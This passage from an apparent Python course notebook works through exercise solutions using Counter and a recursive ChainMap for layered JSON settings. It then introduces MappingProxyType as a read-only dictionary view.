Now, the only thing still missing is the fact that even though the counters may sometimes (pure luck!) appear sorted, they are not guaranteed to be so. For example, let's add `d4` as follows:


```
d4 = {'modula-2': 100}
```


```
merge(d1, d2, d3, d4)
```




    Counter({'python': 17,
             'java': 13,
             'c#': 12,
             'javascript': 15,
             'c++': 10,
             'go': 9,
             'erlang': 5,
             'haskell': 2,
             'pascal': 1,
             'modula-2': 100})



As you can see, this is not sorted by frequency.

We could use the same technique we used before to sort the dictionary, but here I just want to show you an alternative.

The `Counter` objects have a method called `most_common`. We can use that method, without an argument to return all the freuqncies sorted from highest to lowest:


```
result = merge(d1, d2, d3, d4)
```


```
result.most_common()
```




    [('modula-2', 100),
     ('python', 17),
     ('javascript', 15),
     ('java', 13),
     ('c#', 12),
     ('c++', 10),
     ('go', 9),
     ('erlang', 5),
     ('haskell', 2),
     ('pascal', 1)]



Only thing is we need to make this into a dictionary:


```
dict(result.most_common())
```




    {'modula-2': 100,
     'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}



So, let's finalize our function:


```
from collections import Counter

def merge(*dicts):
    result = Counter()
    for d in dicts:
        result.update(d)
    
    return dict(result.most_common())
```


```
merge(d1, d2, d3, d4)
```




    {'modula-2': 100,
     'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}



##  Exercise 2 - Solution

Suppose you have a list of all possible eye colors:


```
eye_colors = ("amber", "blue", "brown", "gray", "green", "hazel", "red", "violet")
```

Some other collection (say recovered from a database, or an external API) contains a list of `Person` objects that have an eye color property.

Your goal is to create a dictionary that contains the number of people that have the eye color as specified in `eye_colors`. The wrinkle here is that even if no one matches some eye color, say `amber`, your dictionary should still contain an entry `"amber": 0`.

Here is some sample data:


```
class Person:
    def __init__(self, eye_color):
        self.eye_color = eye_color
```


```
from random import seed, choices
seed(0)
persons = [Person(color) for color in choices(eye_colors[2:], k = 50)]
```

As you can see we built up a list of `Person` objects, none of which should have `amber` or `blue` eye colors

Write a function that returns a dictionary with the correct counts for each eye color listed in `eye_colors`.

We're going to use the `Counter` class for this problem.
However, simply counting the eye colors in the `person` list is not going to be quite enough:


```
from collections import Counter
```


```
counts = Counter(p.eye_color for p in persons)
```


```
counts
```




    Counter({'violet': 12,
             'red': 10,
             'green': 8,
             'gray': 10,
             'hazel': 7,
             'brown': 3})



As you can see we do not have entries for `amber` and `blue` for example.

We could approach this in one of two ways:
1. add zero count key/value pairs after the counting has occurred
2. or, pre-initialize the `Counter` object with all the possible eye colors set to a count of `0`.

Let's try the first approach:


```
counts = Counter(p.eye_color for p in persons)
```


```
result = {color: counts.get(color, 0) for color in eye_colors}
```


```
result
```




    {'amber': 0,
     'blue': 0,
     'brown': 3,
     'gray': 10,
     'green': 8,
     'hazel': 7,
     'red': 10,
     'violet': 12}



And now the second approach, where we initialize our Counter object with zero counts for each eye color first, and **then** do the counting:


```
counts = Counter({color: 0 for color in eye_colors})
```


```
counts
```




    Counter({'amber': 0,
             'blue': 0,
             'brown': 0,
             'gray': 0,
             'green': 0,
             'hazel': 0,
             'red': 0,
             'violet': 0})



As you can see we have each color with a count of zero - now we simply update the counter based on the results in the `persons` list:


```
counts.update(p.eye_color for p in persons)
```


```
counts
```




    Counter({'amber': 0,
             'blue': 0,
             'brown': 3,
             'gray': 10,
             'green': 8,
             'hazel': 7,
             'red': 10,
             'violet': 12})



Finally, let's package up one of those solutions into a function:


```
def count_eye_colors(persons, possible_eye_colors):
    counts = Counter({color: 0 for color in possible_eye_colors})
    counts.update(p.eye_color for p in persons)
    return counts
```

which we can then call like this:


```
count_eye_colors(persons, eye_colors)
```




    Counter({'amber': 0,
             'blue': 0,
             'brown': 3,
             'gray': 10,
             'green': 8,
             'hazel': 7,
             'red': 10,
             'violet': 12})



##  Exercises

#### Exercise #1

Let's revisit an exercise we did right after the section on dictionaries.

You have text data spread across multiple servers. Each server is able to analyze this data and return a dictionary that contains words and their frequency.

Your job is to combine this data to create a single dictionary that contains all the words and their combined frequencies from all these data sources. Bonus points if you can make your dictionary sorted by frequency (highest to lowest).

For example, you may have three servers that each return these dictionaries:


```
d1 = {'python': 10, 'java': 3, 'c#': 8, 'javascript': 15}
d2 = {'java': 10, 'c++': 10, 'c#': 4, 'go': 9, 'python': 6}
d3 = {'erlang': 5, 'haskell': 2, 'python': 1, 'pascal': 1}
```

Your resulting dictionary should look like this:


```
d = {'python': 17,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10,
     'go': 9,
     'erlang': 5,
     'haskell': 2,
     'pascal': 1}
```

If only servers 1 and 2 return data (so d1 and d2), your results would look like:


```
d = {'python': 16,
     'javascript': 15,
     'java': 13,
     'c#': 12,
     'c++': 10, 
     'go': 9}
```

This was one solution to the problem:


```
def merge(*dicts):
    unsorted = {}
    for d in dicts:
        for k, v in d.items():
            unsorted[k] = unsorted.get(k, 0) + v
            
    # create a dictionary sorted by value
    return dict(sorted(unsorted.items(), key=lambda e: e[1], reverse=True))
```

Implement two different solutions to this problem:

**a**: Using `defaultdict` objects

**b**: Using `Counter` objects

---

#### Exercise #2

Suppose you have a list of all possible eye colors:


```
eye_colors = ("amber", "blue", "brown", "gray", "green", "hazel", "red", "violet")
```

Some other collection (say recovered from a database, or an external API) contains a list of `Person` objects that have an eye color property.

Your goal is to create a dictionary that contains the number of people that have the eye color as specified in `eye_colors`. The wrinkle here is that even if no one matches some eye color, say `amber`, your dictionary should still contain an entry `"amber": 0`.

Here is some sample data:


```
class Person:
    def __init__(self, eye_color):
        self.eye_color = eye_color
```


```
from random import seed, choices
seed(0)
persons = [Person(color) for color in choices(eye_colors[2:], k = 50)]
```

As you can see we built up a list of `Person` objects, none of which should have `amber` or `blue` eye colors

Write a function that returns a dictionary with the correct counts for each eye color listed in `eye_colors`.

---

#### Exercise #3

You are given three JSON files, representing a default set of settings, and environment specific settings.
The files are included in the downloads, and are named:
* `common.json`
* `dev.json`
* `prod.json`

Your goal is to write a function that has a single argument (the environment name) and returns the "combined" dictionary that merges the two dictionaries together, with the environment specific settings overriding any common settings already defined.

For simplicity, assume that the argument values are going to be the same as the file names, without the `.json` extension. So for example, `dev` or `prod`.

The wrinkle: We don't want to duplicate data for the "merged" dictionary - use `ChainMap` to implement this instead.

##  Exercise 3 - Solution

You are given three JSON files, representing a default set of settings, and environment specific settings.
The files are included in the downloads, and are named:
* `common.json`
* `dev.json`
* `prod.json`

Your goal is to write a function that has a single argument, the environment name, and returns the "combined" dictionary that merges the two dictionaries together, with the environment specific settings overriding any common settings already defined.

For simplicity, assume that the argument values are going to be the same as the file names, without the `.json` extension. So for example, `dev` or `prod`.

The wrinkle: We don't want to duplicate data for the "merged" dictionary - use `ChainMap` to implement this instead.

The first thing we'll need to do is write a function to load the JSON files:


```
import json

def load_settings(env):
    # assume file name is <env>.json
    with open(f'{env}.json') as f:
        settings = json.load(f)
    return settings
```


```
from pprint import pprint
```


```
pprint(load_settings('common'))
```

    {'data': {'input_root': '/default/path/inputs',
              'numerics': {'precision': 6, 'type': 'Decimal'},
              'output_root': '/default/path/outputs'},
     'database': {'db_name': 'deepdive', 'port': 5432, 'schema': 'public'},
     'logs': {'format': '%(asctime)s: %(levelname)s: %(clientip)s %(user)s '
                        '%(message)s',
              'level': 'info'}}
    


```
pprint(load_settings('dev'))
```

    {'data': {'input_root': '/dev/path/inputs',
              'numerics': {'type': 'float'},
              'operators': {'add': '__add__'},
              'output_root': '/dev/path/outputs'},
     'database': {'pwd': 'test', 'user': 'test'},
     'logs': {'format': '%(asctime)s: %(levelname)s: %(clientip)s %(user)s '
                        '%(filename)s %(funcName)s %(message)s',
              'level': 'trace'}}
    


```
pprint(load_settings('prod'))
```

    {'data': {'input_root': '$DATA_INPUT_PATH', 'output_root': '$DATA_OUTPUT_PATH'},
     'database': {'pwd': '$PG_PWD', 'user': '$PG_USER'}}
    

OK, so our function seems to work fine.
Now time to "combine" our settings - let's try this simple approach first.

Spoiler alert: this won't work as expected!


```
from collections import ChainMap

def settings(env):
    # combine common.json and <env>.json, with env settings taking precedence
    common_settings = load_settings('common')
    env_settings = load_settings(env)
    return ChainMap(env_settings, common_settings)
```


```
dev = settings('dev')
```


```
for k, v in dev.items():
    print(k, ':', v)
```

    data : {'input_root': '/dev/path/inputs', 'output_root': '/dev/path/outputs', 'numerics': {'type': 'float'}, 'operators': {'add': '__add__'}}
    logs : {'level': 'trace', 'format': '%(asctime)s: %(levelname)s: %(clientip)s %(user)s %(filename)s %(funcName)s %(message)s'}
    database : {'user': 'test', 'pwd': 'test'}
    

**What happened to the values that were in `common`??**

For example, we don't see the `database` `port`??

This does not work as intended because of sub-dictionaries - as you can see the dictionary for `database` for example is the one from `dev`, and not a "combined" dictionary.

`ChainMap` is not recursive, so this is not going to work for us as it stands.

We need to use a recursive approach to handle any amount of nesting.

Let's think how we would do this for a single level.

When we chain two dictionaries together, we will have to replace any sub-dictionary with a chain of the sub-dictionaries further down the line - fortunately our line is two, since we only deal with `common` and either `dev` or `prod` (or whatever environment names we want to support).

So if a key in `dev` (for example), has a dictionary value, we need to chain that sub-dictionary too. And if any of the keys in the chained-subdictionary contains nested dictionaries, we need to chain those too.


```
def chain_recursive(d1, d2):
    chain = ChainMap(d1, d2)
    for k, v in d1.items():
        if isinstance(v, dict) and k in d2:
            chain[k] = chain_recursive(d1[k], d2[k])
    return chain
```


```
d1 = load_settings('common')
d2 = load_settings('dev')
```


```
dev = chain_recursive(d2, d1)
```


```
pprint(dev)
```

    ChainMap({'data': ChainMap({'input_root': '/dev/path/inputs',
                                'numerics': ChainMap({'type': 'float'},
                                                     {'precision': 6,
                                                      'type': 'Decimal'}),
                                'operators': {'add': '__add__'},
                                'output_root': '/dev/path/outputs'},
                               {'input_root': '/default/path/inputs',
                                'numerics': {'precision': 6, 'type': 'Decimal'},
                                'output_root': '/default/path/outputs'}),
              'database': ChainMap({'pwd': 'test', 'user': 'test'},
                                   {'db_name': 'deepdive',
                                    'port': 5432,
                                    'schema': 'public'}),
              'logs': ChainMap({'format': '%(asctime)s: %(levelname)s: '
                                          '%(clientip)s %(user)s %(filename)s '
                                          '%(funcName)s %(message)s',
                                'level': 'trace'},
                               {'format': '%(asctime)s: %(levelname)s: '
                                          '%(clientip)s %(user)s %(message)s',
                                'level': 'info'})},
             {'data': {'input_root': '/default/path/inputs',
                       'numerics': {'precision': 6, 'type': 'Decimal'},
                       'output_root': '/default/path/outputs'},
              'database': {'db_name': 'deepdive', 'port': 5432, 'schema': 'public'},
              'logs': {'format': '%(asctime)s: %(levelname)s: %(clientip)s '
                                 '%(user)s %(message)s',
                       'level': 'info'}})
    

This means that we can lookup the log level for example, which we know should be `trace` for our development environment:


```
dev['logs']['level']
```




    'trace'



If instead we load up our production environment:


```
d3 = load_settings('prod')
prod = chain_recursive(d3, d1)
```


```
prod['logs']['level']
```




    'info'



and the database port, from the common settings:


```
prod['database']['port']
```




    5432



but, we have the override for the user:


```
prod['database']['user']
```




    '$PG_USER'



So now, let's package this up in a neat function for our users:


```
def settings(env):
    common_settings = load_settings('common')
    env_settings = load_settings(env)
    return chain_recursive(env_settings, common_settings)
```


```
prod = settings('prod')
```


```
prod['database']['user']
```




    '$PG_USER'




```
dev = settings('dev')
dev['logs']['level']
```




    'trace'



Let's also check some deeper nested dictionaries:


```
prod['data']['numerics']['type']
```




    'Decimal'




```
dev['data']['numerics']['type']
```




    'float'




```
dev['data']['operators']
```




    {'add': '__add__'}



So this seems to work just fine. You may want to further refine this to merge list type values as well - for example, `key1: [1, 2, 3]` in `common` and `key2: [3, 4, 5]` in `dev` might result in `key1: [1, 2, 3, 4, 5]`. This is a rarer requirement, but do note that the solution I present here will simply replace the entire list with what is in the `dev` file, not merge the two lists.

# Section 11 - Extras

##  MappingProxyType

The mapping proxy type is an easy way to create a read-only **view** of any dictionary.

This can be handy if you want to pass a dictionary around, and have that view reflect the underlying dictionary (even if it is mutated), but not allow the receiver to be able to modify the dictionary.

In fact, this is used by classes all the time:


```
class Test:
    a = 100
```


```
Test.__dict__
```




    mappingproxy({'__module__': '__main__',
                  'a': 100,
                  '__dict__': <attribute '__dict__' of 'Test' objects>,
                  '__weakref__': <attribute '__weakref__' of 'Test' objects>,
                  '__doc__': None})



As you can see, what is returned here is not actually a `dict` object, but a `mappingproxy`.

To create a mapping proxy from a dictionary we use the `MappingProxyType` from the `types` module:


```
from types import MappingProxyType
```


```
d = {'a': 1, 'b': 2}
```


```
mp = MappingProxyType(d)
```

This mapping proxy still behaves like a dictionary:


```
list(mp.keys())
```




    ['a', 'b']




```
list(mp.values())
```




    [1, 2]




```
list(mp.items())
```




    [('a', 1), ('b', 2)]




```
mp.get('a', 'not found')
```




    1




```
mp.get('c', 'not found')
```




    'not found'



But we cannot mutate it:


```
try:
    mp['a'] = 100
except TypeError as ex:
    print('TypeError: ', ex)
```

    TypeError:  'mappingproxy' object does not support item assignment
    

On the other hand, if the underlying dictionary is mutated:


```
d['a'] = 100
d['c'] = 'new item'
```


```
d
```




    {'a': 100, 'b': 2, 'c': 'new item'}




```
mp
```




    mappingproxy({'a': 100, 'b': 2, 'c': 'new item'})



And as you can see, the mapping proxy "sees" the changes in the undelying dictionary - so it behaves like a view, in the same way `keys()`, `values()` and `items()` do.

You can obtain a **shallow** copy of the proxy by using the `copy()` method:


```
cp = mp.copy()
```


```
cp
```




    {'a': 100, 'b': 2, 'c': 'new item'}



As you can see, `cp` is a plain `dict`.
